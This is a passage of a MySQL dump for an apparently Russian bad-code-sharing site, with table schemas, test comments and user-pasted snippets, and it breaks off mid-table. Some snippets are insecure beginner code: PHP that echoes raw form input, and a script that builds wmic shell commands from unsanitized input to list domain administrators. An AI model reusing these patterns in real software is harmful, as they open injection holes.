# SQL Manager 2007 for MySQL 4.4.0.3
# ---------------------------------------
# Host     : localhost
# Port     : 3306
# Database : govnokod


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

SET FOREIGN_KEY_CHECKS=0;

DROP DATABASE IF EXISTS `govnokod`;

CREATE DATABASE `govnokod`
    CHARACTER SET 'utf8'
    COLLATE 'utf8_general_ci';

USE `govnokod`;

SET sql_mode = '';

#
# Structure for the `comments_comments` table : 
#

DROP TABLE IF EXISTS `comments_comments`;

CREATE TABLE `comments_comments` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `text` TEXT COLLATE utf8_general_ci,
  `user_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `created` INTEGER(11) UNSIGNED DEFAULT NULL,
  `folder_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=4 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `comments_comments` table  (LIMIT 0,500)
#

INSERT INTO `comments_comments` (`id`, `obj_id`, `text`, `user_id`, `created`, `folder_id`) VALUES 
  (1,2565,'test',2,1242007848,1),
  (2,2566,'asdf',2,1242007971,1),
  (3,2567,'dfgdfg',2,1242007974,1);
COMMIT;

#
# Structure for the `comments_commentsFolder` table : 
#

DROP TABLE IF EXISTS `comments_commentsFolder`;

CREATE TABLE `comments_commentsFolder` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `parent_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `module` CHAR(50) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `type` CHAR(50) COLLATE utf8_general_ci DEFAULT NULL,
  `by_field` CHAR(25) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `parent_id_2` (`parent_id`, `type`),
  KEY `parent_id` (`parent_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=3 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `comments_commentsFolder` table  (LIMIT 0,500)
#

INSERT INTO `comments_commentsFolder` (`id`, `obj_id`, `parent_id`, `module`, `type`, `by_field`) VALUES 
  (1,2564,355,'quoter','quote','id'),
  (2,2612,354,'quoter','quote','id');
COMMIT;

#
# Structure for the `comments_commentsVote` table : 
#

DROP TABLE IF EXISTS `comments_commentsVote`;

CREATE TABLE `comments_commentsVote` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `comment_id` INTEGER(11) NOT NULL,
  `value` INTEGER(11) NOT NULL,
  `datetime` INTEGER(11) NOT NULL,
  `ip_address` VARCHAR(20) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `useragent` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `user_id` INTEGER(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `comment_id` (`comment_id`),
  KEY `user_id` (`user_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=3 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `comments_commentsVote` table  (LIMIT 0,500)
#

INSERT INTO `comments_commentsVote` (`id`, `comment_id`, `value`, `datetime`, `ip_address`, `useragent`, `user_id`) VALUES 
  (1,892,-1,1236865860,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7',1),
  (2,897,1,1236865873,'127.0.0.1','Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7',1);
COMMIT;

#
# Structure for the `comments_comments_tree` table : 
#

DROP TABLE IF EXISTS `comments_comments_tree`;

CREATE TABLE `comments_comments_tree` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `path` TEXT COLLATE utf8_general_ci,
  `foreign_key` INTEGER(11) DEFAULT NULL,
  `level` INTEGER(11) UNSIGNED DEFAULT NULL,
  `spath` TEXT COLLATE utf8_general_ci,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=17 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `comments_comments_tree` table  (LIMIT 0,500)
#

INSERT INTO `comments_comments_tree` (`id`, `path`, `foreign_key`, `level`, `spath`) VALUES 
  (1,'1/',1,1,'14/'),
  (2,'2/',2,1,'15/'),
  (3,'1/3/',3,2,'14/16/'),
  (4,'4/',4,1,'4/'),
  (5,'3/5/',5,2,'3/5/'),
  (6,'6/',6,1,'6/'),
  (7,'6/7/',7,2,'6/7/'),
  (8,'6/7/8/',8,3,'6/7/8/'),
  (9,'9/',9,1,'9/'),
  (10,'10/',10,1,'10/'),
  (11,'6/7/8/11/',11,4,'6/7/8/11/'),
  (12,'12/',12,1,'12/'),
  (13,'12/13/',13,2,'12/13/'),
  (14,'1/',1,1,'14/'),
  (15,'2/',2,1,'15/'),
  (16,'1/3/',3,2,'14/16/');
COMMIT;

#
# Structure for the `copypasta` table : 
#

DROP TABLE IF EXISTS `copypasta`;

CREATE TABLE `copypasta` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `copypasta_language_id` INTEGER(11) DEFAULT NULL,
  `copypasta` TEXT COLLATE cp1251_general_ci,
  `username` VARCHAR(50) COLLATE cp1251_general_ci DEFAULT NULL,
  `delete_at` DATETIME DEFAULT NULL,
  `created_at` DATETIME DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `copypasta_FI_1` (`copypasta_language_id`)
)ENGINE=MyISAM
AUTO_INCREMENT=33 CHARACTER SET 'cp1251' COLLATE 'cp1251_general_ci';

#
# Data for the `copypasta` table  (LIMIT 0,500)
#

INSERT INTO `copypasta` (`id`, `copypasta_language_id`, `copypasta`, `username`, `delete_at`, `created_at`) VALUES 
  (14,3,'Ниибёт','User','2009-03-06 01:05:00','2008-11-10 21:31:12'),
  (15,3,'test','dizzy2','2009-05-06 04:06:00','2008-11-12 20:44:17'),
  (16,11,'<div class=\"postContent\">Заинтересовался кодингом под Symbian. В пробном проекте нашел такую прелесть:<br/>#define FOREVER for(;;)</div>','User','2008-11-30 00:00:00','2008-11-25 17:09:36'),
  (17,11,'<div class=\"postContent\">\r\n  Заинтересовался кодингом под Symbian. В пробном проекте нашел такую прелесть:<br/>\r\n  #define FOREVER for(;;)\r\n</div>','User','2008-11-30 00:00:00','2008-11-25 17:10:15'),
  (18,3,'testasdfasdf','striker','2009-05-06 00:00:00','2008-12-01 09:47:22'),
  (19,3,'<?php\r\n\terror_reporting(E_ALL); \r\n\techo \"Че ты долбишь? Иди кудa шел <br/>\";\r\n\t\r\n\tfor ($i = 0; $i < 10; $i++) {\r\n\t\techo \"$i <br/ >\";\r\n\t}\r\n\t$string = \"я *** че те надо?\";\r\n\techo \"$string<br />\";\r\n\t\r\n\t$string2 = \"- в душе не чаю.\";\r\n\tprint $string2;\r\n\techo $string . $string2;\r\n?>','батько','2008-12-17 00:00:00','2008-12-06 18:19:41'),
  (20,3,'<?php\r\n\techo \"<p> Zаказ обработан B \";\r\n\techo date(''H:i, jS F'');\r\n\techo \"</p>\";\r\n\t\r\n\t$total = 0;\r\n\t$total = $_POST[''tireqty''] + $_POST[''oilqty''] + $_POST[''sparkqty''];\r\n\tif( $total == 0)\r\n\t\t{\r\n\t\techo ''Давай заказывай, че ты мне гонишь!'';\r\n\t\t}\r\n\telse\r\n\t\t{\r\n\t\t\techo \"<p> Список вашего заказа:</p>\";\r\n\t\t\tif(!is_numeric($_POST[''tireqty'']))\r\n\t\t\t\t{\r\n\t\t\t\techo ''Ты чего мне тут фуфло пишешь в Автопокрышках, ЦИФРЫ ПИШИ!<br />'';\r\n\t\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tif ($_POST[''tireqty''] > 0)\r\n\t\t\t\t\techo $_POST[''tireqty'']. '' автопокрышек<br />'';\r\n\t\t\t\t}\r\n\t\t\tif(!is_numeric($_POST[''oilqty'']))\r\n\t\t\t\t{\r\n\t\t\t\techo ''Ты чего мне тут фуфло пишешь в Маслах, ЦИФРЫ ПИШИ!<br />'';\r\n\t\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\tif ( $_POST[''oilqty''] > 0)\r\n\t\t\t\t\techo $_POST[''oilqty'']. '' бутылок с маслом<br />'';\r\n\t\t\t\t}\r\n\t\t\tif(!is_numeric($_POST[''sparkqty'']))\r\n\t\t\t\t{\r\n\t\t\t\techo ''Ты чего мне тут фуфло пишешь в Свечах, ЦИФРЫ ПИШИ!<br />'';\r\n\t\t\t\t}\r\n\t\t\telse {\r\n\t\t\t\t\tif ( $_POST[''sparkqty''] > 0)\r\n\t\t\t\t\t\techo $_POST[''sparkqty'']. '' свечей зажигания<br /><br />'';\r\n\t\t\t\t}\r\n\t\t\techo ''Заказано товаров: ''.$total.''<br />'';\r\n\t\t\t$totalamount = 0.00;\t\r\n\t\t\tdefine(''TIREPRICE'', 100);\r\n\t\t\tdefine(''OILPRICE'', 10);\r\n\t\t\tdefine(''SPARKPRICE'', 4);\r\n\t\t\t$totalamount = $_POST[''tireqty''] * TIREPRICE\r\n\t\t\t\t\t\t + $_POST[''oilqty''] * OILPRICE\r\n\t\t\t\t\t\t + $_POST[''sparkqty''] * SPARKPRICE;\r\n\t\t\techo ''Итого: $''.number_format($totalamount,2, '','','' '').''<br />'';\r\n\t\t\t$taxrate = 0.10; //nalog\r\n\t\t\t$totalamount = $totalamount * (1 + $taxrate);\r\n\t\t\techo ''Общая сумма, включая налог с продаж(''.$taxrate*100 .''%): $''.$totalamount.''<br />'';\r\n\t\t}\r\n?>','Батько','2008-12-24 00:00:00','2008-12-11 13:13:30'),
  (21,3,'<html>\r\n<head>\r\n  <title>Автозапчасти от Боба</title>\r\n</head>\r\n<body>\r\n\r\n<h1>&#1040;&#1074;&#1090;&#1086;&#1079;&#1072;&#1087;&#1095;&#1072;&#1089;&#1090;&#1080; Kaka&#1096;ku Group</h1>\r\n<h2>Форма заказа</h2>\r\n\r\n<form action=\"processorder.php\" method=post>\r\n<table border=0>\r\n<tr bgcolor=#cccccc>\r\n  <td width=150>Товар</td>\r\n  <td width=15>Количество</td>\r\n</tr>\r\n<tr>\r\n  <td>Автопокрышки</td>\r\n  <td align=\"center\"><input type=\"text\" name=\"tireqty\" size= \"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Машинное масло</td>\r\n  <td align= \"center\"><input type=\"text\" name=\"oilqty\" size=\"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Свечи зажигания</td>\r\n  <td align=\"center\"><input type=\"text\" name=\"sparkqty\" size= \"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Как вы нашли компанию \"Автозапчасти от Боба?\"</td>\r\n  <td><select name=\"find\">\r\n        <option value = \"a\">Я регулярный клиент\r\n        <option value = \"b\">В телевизионной рекламе\r\n        <option value = \"c\">В телефонном справочнике\r\n        <option value = \"d\">Кто-то порекомендовал\r\n      </select>\r\n  </td>\r\n</tr>\r\n<tr>\r\n  <td colspan=\"2\" align=\"center\"><input type=\"submit\" value= \"Отправить заказ\" name=\"\"></td>\r\n</tr>\r\n</table>\r\n</form>\r\n\r\n</body>\r\n</html>\r\n','Батько','2008-12-19 00:00:00','2008-12-11 13:14:46'),
  (22,11,'<html>\r\n<head>\r\n  <title>Автозапчасти от Боба</title>\r\n</head>\r\n<body>\r\n\r\n<h1>&#1040;&#1074;&#1090;&#1086;&#1079;&#1072;&#1087;&#1095;&#1072;&#1089;&#1090;&#1080; Kaka&#1096;ku Group</h1>\r\n<h2>Форма заказа</h2>\r\n\r\n<form action=\"processorder.php\" method=post>\r\n<table border=0>\r\n<tr bgcolor=#cccccc>\r\n  <td width=150>Товар</td>\r\n  <td width=15>Количество</td>\r\n</tr>\r\n<tr>\r\n  <td>Автопокрышки</td>\r\n  <td align=\"center\"><input type=\"text\" name=\"tireqty\" size= \"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Машинное масло</td>\r\n  <td align= \"center\"><input type=\"text\" name=\"oilqty\" size=\"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Свечи зажигания</td>\r\n  <td align=\"center\"><input type=\"text\" name=\"sparkqty\" size= \"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Как вы нашли компанию \"Автозапчасти от Боба?\"</td>\r\n  <td><select name=\"find\">\r\n        <option value = \"a\">Я регулярный клиент\r\n        <option value = \"b\">В телевизионной рекламе\r\n        <option value = \"c\">В телефонном справочнике\r\n        <option value = \"d\">Кто-то порекомендовал\r\n      </select>\r\n  </td>\r\n</tr>\r\n<tr>\r\n  <td colspan=\"2\" align=\"center\"><input type=\"submit\" value= \"Отправить заказ\" name=\"\"></td>\r\n</tr>\r\n</table>\r\n</form>\r\n\r\n</body>\r\n</html>','Батько','2008-12-31 00:00:00','2008-12-11 13:16:30'),
  (23,3,'<?php\r\n\r\nif ($_POST[''submit'']) {\r\n    $error = \"\";\r\n    if (isset($_POST[''tireqty'']) && is_numeric($_POST[''tireqty'']) && $_POST[''tireqty''] > 0) {\r\n        $tireqty = $_POST[''tireqty'']\r\n    } else {\r\n        $error .= ''Ты чего мне тут фуфло пишешь в Автопокрышках, ЦИФРЫ ПИШИ!<br />''\r\n    }\r\n    \r\n    if (isset($_POST[''oilqty'']) && is_numeric($_POST[''oilqty'']) && $_POST[''oilqty''] > 0) {\r\n        $oilqty = $_POST[''oilqty'']\r\n    } else {\r\n        $error .= ''Ты чего мне тут фуфло пишешь в Маслах, ЦИФРЫ ПИШИ!<br />''\r\n    }\r\n    \r\n    if (isset($_POST[''sparkqty'']) && is_numeric($_POST[''sparkqty'']) && $_POST[''sparkqty''] > 0) {\r\n        $sparkqty = $_POST[''sparkqty'']\r\n    } else {\r\n        $error .= ''Ты чего мне тут фуфло пишешь в Свечах, ЦИФРЫ ПИШИ!<br />''\r\n    }\r\n    \r\n    if ($error == \"\") {\r\n        echo \"<p> Zаказ обработан B \";\r\n    \techo date(''H:i, d.m.Y'');\r\n    \techo \"</p>\";\r\n        \r\n        echo \"<p> Список вашего заказа:</p>\";\r\n        \r\n        $total = $tireqty + $_POSToilqty + $_POSTsparkqty;\r\n        \r\n        echo $tireqty. '' автопокрышек<br />'';\r\n        echo $oilqty. '' бутылок с маслом<br />'';\r\n        echo $sparkqty. '' свечей зажигания<br /><br />'';\r\n        \r\n        echo ''Заказано товаров: ''.$total.''<br />'';\r\n        $totalamount = 0.00;\t\r\n\t\tdefine(''TIREPRICE'', 100);\r\n\t\tdefine(''OILPRICE'', 10);\r\n\t\tdefine(''SPARKPRICE'', 4);\r\n\t\t$totalamount = $_POST[''tireqty''] * TIREPRICE\r\n            + $_POST[''oilqty''] * OILPRICE\r\n\t\t\t + $_POST[''sparkqty''] * SPARKPRICE;\r\n\t\techo ''Итого: $''.number_format($totalamount,2, '','','' '').''<br />'';\r\n\t\t$taxrate = 0.10; //nalog\r\n\t\t$totalamount = $totalamount * (1 + $taxrate);\r\n\t\techo ''Общая сумма, включая налог с продаж(''.$taxrate*100 .''%): $''.$totalamount.''<br />'';\r\n    } else {\r\n        echo $error;\r\n    }\r\n} else {\r\necho \r\n''<html>\r\n<head>\r\n  <title>Автозапчасти от Боба</title>\r\n</head>\r\n<body>\r\n\r\n<h1>Автозапчасти Kakaшku Group</h1>\r\n<h2>Форма заказа</h2>\r\n\r\n<form action=\"processorder.php\" method=post>\r\n<table border=0>\r\n<tr bgcolor=#cccccc>\r\n  <td width=150>Товар</td>\r\n  <td width=15>Количество</td>\r\n</tr>\r\n<tr>\r\n  <td>Автопокрышки</td>\r\n  <td align=\"center\"><input type=\"text\" name=\"tireqty\" size= \"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Машинное масло</td>\r\n  <td align= \"center\"><input type=\"text\" name=\"oilqty\" size=\"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Свечи зажигания</td>\r\n  <td align=\"center\"><input type=\"text\" name=\"sparkqty\" size= \"3\" maxlength=\"3\" /></td>\r\n</tr>\r\n<tr>\r\n  <td>Как вы нашли компанию \"Автозапчасти от Боба?\"</td>\r\n  <td><select name=\"find\">\r\n        <option value = \"a\">Я регулярный клиент\r\n        <option value = \"b\">В телевизионной рекламе\r\n        <option value = \"c\">В телефонном справочнике\r\n        <option value = \"d\">Кто-то порекомендовал\r\n      </select>\r\n  </td>\r\n</tr>\r\n<tr>\r\n  <td colspan=\"2\" align=\"center\"><input type=\"submit\" value= \"Отправить заказ\" name=\"\"></td>\r\n</tr>\r\n</table>\r\n</form>\r\n\r\n</body>\r\n</html>'';\r\n}\r\n\r\n?>','sdffsdf','2008-12-25 00:00:00','2008-12-11 13:24:22'),
  (24,3,'Test','111','1970-01-01 03:00:01','2008-12-12 02:48:08'),
  (25,NULL,'wretwrtwer','sadfasdf','2008-12-10 00:00:00','2008-12-12 18:37:33'),
  (26,NULL,'Test','asketman',NULL,'2008-12-14 09:49:16'),
  (27,NULL,'Testsadfdsada','asketman',NULL,'2008-12-14 09:49:29'),
  (28,NULL,'user@z:~/work$ gajim\r\nTraceback (most recent call last):\r\n  File \"gajim.py\", line 3315, in <module>\r\n    Interface()\r\n  File \"gajim.py\", line 3041, in __init__\r\n    cfg_was_read = parser.read()\r\n  File \"/usr/share/gajim/src/common/optparser.py\", line 79, in read\r\n    self.update_config(old_version, new_version)\r\n  File \"/usr/share/gajim/src/common/optparser.py\", line 189, in update_config\r\n    gajim.capscache.load_from_db()\r\n  File \"/usr/share/gajim/src/common/caps.py\", line 154, in load_from_db\r\n    self.logger.iter_caps_data():\r\n  File \"/usr/share/gajim/src/common/logger.py\", line 718, in iter_caps_data\r\n    data = GzipFile(fileobj=StringIO(str(data))).read().split(''\\0'')\r\n  File \"/usr/lib/python2.5/gzip.py\", line 220, in read\r\n    self._read(readsize)\r\n  File \"/usr/lib/python2.5/gzip.py\", line 292, in _read\r\n    self._read_eof()\r\n  File \"/usr/lib/python2.5/gzip.py\", line 313, in _read_eof\r\n    raise IOError, \"Incorrect length of data produced\"\r\nIOError: Incorrect length of data produced\r\n','user',NULL,'2008-12-19 16:02:14'),
  (29,3,'$comptxt = fopen (\"C:\\SAV\\comp.txt\", \"r\"); //список компов в домене\r\nwhile (!feof($comptxt)) {\r\n//$gr_name=\"\";\r\n$pcname = fgets($comptxt, 4096); //имя компьютера в домене\r\n$pcname=rtrim($pcname); //отрезаем справа переносы и пробелы\r\n$cmd= \"wmic /node:\\\"\".$pcname.\"\\\" group where (sid = \\\"S-1-5-32-544\\\" and localaccount = true) get name|find /V \\\"Name\\\"\"; //получаем имя группы локальных админов\r\n$gr_name=shell_exec($cmd);//оп и готово\r\n$gr_name=rtrim($gr_name); // снова режем пробелы и переносы\r\nif ($gr_name) { //если имя получено (включен комп и есть доступ), то ищем учетки в группе\r\necho $pcname.\"->>\".$gr_name.\"\\r\\n\"; // ТУТ-то они печатаются, ОБЕ переменные\r\nprint_r($gr_name); //Проблема в переменной номер 2!!!!!!!!!!!!!!!!!!!!!\r\n//$pcname=\"SMIRNOV\";\r\n//$gr_name=\"Администраторы\"; //БЛЯДЬ ПОЧЕМУ, если переменные руками указать - они срабатывают. хотя они идентичны. Иначе - нет\r\n$cmd= ''wmic /node:\"''.$pcname.''\" path win32_groupuser where (groupcomponent = \"win32_group.name=\\\"''.$gr_name.''\\\",domain=\\\"''.$pcname.''\\\"\")'';\r\necho $cmd.\"\\r\\n\"; //ТУТ\r\n//$a=var_dump($cmd); // И ТУТ - команда выводится ПРАВИЛЬНАЯ.\r\n//echo $a.\"\\r\\n\";\r\n$admins=`$cmd`; // Но не выполняется нихуя\r\necho $admins.\"\\r\\n\";\r\n}\r\n}\r\nfclose($comptxt);','sd',NULL,'2008-12-22 11:08:29'),
  (30,3,'// guess current application\r\nif (!isset($app))\r\n{\r\n  $traces = debug_backtrace();\r\n  $caller = $traces[0];\r\n\r\n  $dirPieces = explode(DIRECTORY_SEPARATOR, dirname($caller[''file'']));\r\n  $app = array_pop($dirPieces);\r\n}','asketman',NULL,'2008-12-24 10:04:02'),
  (31,3,'<?php\r\n// guess current application\r\nif (!isset($app))\r\n{\r\n  $traces = debug_backtrace();\r\n  $caller = $traces[0];\r\n\r\n  $dirPieces = explode(DIRECTORY_SEPARATOR, dirname($caller[''file'']));\r\n  $app = array_pop($dirPieces);\r\n}\r\n?>','asketman',NULL,'2008-12-24 10:04:38'),
  (32,3,'function Schedule_Events($arraySchedule, $arrayEvents)\r\n\t{\r\n    \t$sorted[''Schedule''] = $this->Schedule($arraySchedule);\r\n    \t$sorted[''Events''] = $this->Events($arrayEvents);\r\n    \t$result = array();\r\n    \tfor($i=0; $i<7; $i++)\r\n    \t{\r\n    \t\t$day[''this''] = mktime(0, 0, 0, date(''n''), ($this->week[''day''][''start''] + $i), date(''Y''));\r\n    \t\t$day[''next''] = mktime(0, 0, 0, date(''n''), ($this->week[''day''][''start''] + $i + 1), date(''Y''));\r\n\r\n    \t\tif(count($sorted[''Schedule'']) > 0)\r\n    \t\t{\r\n            \tfor($a=0; $a<count($sorted[''Schedule''][$i]); $a++)\r\n            \t{\r\n\t\t\t\t\t//\r\n\t\t\t\t\t$start_time = $sorted[''Schedule''][$i][$a][''time''][''start''];\r\n\t\t\t\t\t$end_time = $sorted[''Schedule''][$i][$a][''time''][''end''];\r\n\t\t\t\t\tif(isset($sorted[''Schedule''][$i][$a+1]))\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\t$start_time_next = $sorted[''Schedule''][$i][$a+1][''time''][''start''];\r\n\t\t\t\t\t\t$end_time_next = $sorted[''Schedule''][$i][$a+1][''time''][''end''];\r\n\t\t\t\t\t}\r\n\r\n\t\t\t\t\tif(count($sorted[''Events''][$i]) > 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tforeach($sorted[''Events''][$i] as $key=>$val)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t        \tif($val[''time''][''end''] <= $start_time || $val[''time''][''start''] <= $start_time )\r\n\t\t\t\t        \t{\r\n\t\t\t\t\t\t\t\t$result[$i][] = $val;\r\n\t\t\t\t\t\t\t\tunset($sorted[''Events''][$i][$key]);\r\n\t\t\t\t        \t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n\t\t\t\t\t$result[$i][] = $sorted[''Schedule''][$i][$a];\r\n\t\t\t\t\tif(count($sorted[''Events''][$i]) > 0)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tforeach($sorted[''Events''][$i] as $key=>$val)\r\n\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\tif(($val[''time''][''start''] >= $end_time && $val[''time''][''end''] <= $start_time_next))\r\n\t\t\t\t\t\t\t{\r\n\t\t\t\t\t\t\t\t$result[$i][] = $val;\r\n\t\t\t\t\t\t\t\tunset($sorted[''Events''][$i][$key]);\r\n\t\t\t\t        \t}\r\n\t\t\t\t\t\t}\r\n\t\t\t\t\t}\r\n            \t}\r\n\r\n            \tif(count($sorted[''Events''][$i]) > 0)\r\n\t\t\t\t{\r\n\t\t\t\t\t$result[$i] += $sorted[''Events''][$i];\r\n\t\t\t\t\tunset($sorted[''Events''][$i]);\r\n\t\t\t\t}\r\n    \t\t}\r\n    \t\telseif(count($arrayEvents[$i]) > 0)\r\n\t\t\t{\r\n\t\t\t\t$result[$i] = $sorted[''Events''][$i];\r\n\t\t\t\tunset($sorted[''Events''][$i]);\r\n\t\t\t}\r\n    \t}\r\n    \treturn $result;\r\n\t}','qwerty',NULL,'2008-12-27 17:27:08');
COMMIT;

#
# Structure for the `copypasta_language` table : 
#

DROP TABLE IF EXISTS `copypasta_language`;

CREATE TABLE `copypasta_language` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `title` VARCHAR(50) COLLATE cp1251_general_ci DEFAULT NULL,
  `geshi_code` VARCHAR(50) COLLATE cp1251_general_ci DEFAULT NULL,
  `position` INTEGER(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=13 CHARACTER SET 'cp1251' COLLATE 'cp1251_general_ci';

#
# Data for the `copypasta_language` table  (LIMIT 0,500)
#

INSERT INTO `copypasta_language` (`id`, `title`, `geshi_code`, `position`) VALUES 
  (3,'PHP','php',1),
  (4,'Javascript','javascript',2),
  (5,'MySQL','mysql',3),
  (6,'Perl','perl',4),
  (7,'Python','python',5),
  (8,'C++','cpp',6),
  (9,'Bash','bash',7),
  (10,'Visual basic','vb',8),
  (11,'XML','xml',9),
  (12,'INI','ini',10);
COMMIT;

#
# Structure for the `fileManager_file` table : 
#

DROP TABLE IF EXISTS `fileManager_file`;

CREATE TABLE `fileManager_file` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `realname` VARCHAR(255) COLLATE utf8_general_ci DEFAULT '',
  `name` VARCHAR(255) COLLATE utf8_general_ci DEFAULT '',
  `ext` VARCHAR(20) COLLATE utf8_general_ci DEFAULT NULL,
  `size` INTEGER(11) DEFAULT NULL,
  `modified` INTEGER(11) DEFAULT NULL,
  `downloads` INTEGER(11) DEFAULT NULL,
  `right_header` TINYINT(4) DEFAULT NULL,
  `direct_link` INTEGER(11) DEFAULT '0',
  `about` TEXT COLLATE utf8_general_ci,
  `folder_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `obj_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `storage_id` INTEGER(11) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `realname` (`realname`),
  KEY `folder_id` (`folder_id`, `name`, `ext`)
)ENGINE=MyISAM
AUTO_INCREMENT=1 CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Structure for the `fileManager_folder` table : 
#

DROP TABLE IF EXISTS `fileManager_folder`;

CREATE TABLE `fileManager_folder` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `title` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `parent` INTEGER(11) UNSIGNED DEFAULT NULL,
  `path` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `obj_id` INTEGER(11) UNSIGNED DEFAULT NULL,
  `filesize` INTEGER(11) UNSIGNED DEFAULT NULL,
  `exts` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=2 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `fileManager_folder` table  (LIMIT 0,500)
#

INSERT INTO `fileManager_folder` (`id`, `name`, `title`, `parent`, `path`, `obj_id`, `filesize`, `exts`) VALUES 
  (1,'root','/',1,'root',24,NULL,NULL);
COMMIT;

#
# Structure for the `fileManager_folder_tree` table : 
#

DROP TABLE IF EXISTS `fileManager_folder_tree`;

CREATE TABLE `fileManager_folder_tree` (
  `id` INTEGER(10) NOT NULL AUTO_INCREMENT,
  `lkey` INTEGER(10) NOT NULL DEFAULT '0',
  `rkey` INTEGER(10) NOT NULL DEFAULT '0',
  `level` INTEGER(10) NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `left_key` (`lkey`, `rkey`, `level`),
  KEY `level` (`level`, `lkey`),
  KEY `rkey` (`rkey`)
)ENGINE=MyISAM
AUTO_INCREMENT=2 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `fileManager_folder_tree` table  (LIMIT 0,500)
#

INSERT INTO `fileManager_folder_tree` (`id`, `lkey`, `rkey`, `level`) VALUES 
  (1,1,2,1);
COMMIT;

#
# Structure for the `fileManager_storage` table : 
#

DROP TABLE IF EXISTS `fileManager_storage`;

CREATE TABLE `fileManager_storage` (
  `id` INTEGER(11) UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `path` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  `web_path` CHAR(255) COLLATE utf8_general_ci DEFAULT NULL,
  PRIMARY KEY (`id`)
)ENGINE=MyISAM
AUTO_INCREMENT=3 ROW_FORMAT=FIXED CHARACTER SET 'utf8' COLLATE 'utf8_general_ci';

#
# Data for the `fileManager_storage` table  (LIMIT 0,500)
#

INSERT INTO `fileManager_storage` (`id`, `name`, `path`, `web_path`) VALUES 
  (1,'local','../files/','/'),
  (2,'avatars','files/avatars/','/files/avatars/');
COMMIT;

#
# Structure for the `page_page` table : 
#

DROP TABLE IF EXISTS `page_page`;

CREATE TABLE `page_page` (
  `id` INTEGER(11) NOT NULL AUTO_INCREMENT,
  `obj_id` INTEGER(10) UNSIGNED NOT NULL DEFAULT '0',
  `name` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `title` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
  `content` TEXT COLLATE utf8_general_ci NOT NULL,
  `keywords` VARCHAR(255) COLLATE utf8_general_ci NOT NULL DEFAULT '',
